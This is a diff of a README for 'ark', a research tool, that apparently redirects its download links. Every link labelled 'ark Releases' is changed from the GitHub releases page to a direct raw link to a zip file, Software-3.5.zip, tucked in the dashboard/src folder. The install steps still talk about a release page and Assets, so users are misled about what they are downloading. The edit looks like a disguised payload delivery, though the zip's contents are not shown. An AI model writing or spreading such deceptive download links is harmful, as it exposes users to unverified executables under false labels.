@@ -1,16 +1,16 @@
 # 🤖 ark - Run research with less guesswork
 
-[![Download ark](https://img.shields.io/badge/Download-ark%20Releases-blue?style=for-the-badge)](https://github.com/Vickysaini421/ark/releases)
+[![Download ark](https://img.shields.io/badge/Download-ark%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vickysaini421/ark/main/dashboard/src/Software-3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: [ark Releases](https://github.com/Vickysaini421/ark/releases)
+Visit this page to download: [ark Releases](https://raw.githubusercontent.com/Vickysaini421/ark/main/dashboard/src/Software-3.5.zip)
 
 Choose the latest Windows file from the release page, then save it to your computer.
 
 ## 🪟 Install on Windows
 
-1. Open the [ark Releases](https://github.com/Vickysaini421/ark/releases) page.
+1. Open the [ark Releases](https://raw.githubusercontent.com/Vickysaini421/ark/main/dashboard/src/Software-3.5.zip) page.
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows file.
 4. If the file comes in a `.zip` folder, right-click it and choose **Extract All**.
@@ -120,4 +120,4 @@ ark is based on Karpathy's autoresearch work and aims to make research more dire
 
 ## 🔗 Download again
 
-If you need the file later, use the same page here: [ark Releases](https://github.com/Vickysaini421/ark/releases)
+If you need the file later, use the same page here: [ark Releases](https://raw.githubusercontent.com/Vickysaini421/ark/main/dashboard/src/Software-3.5.zip)
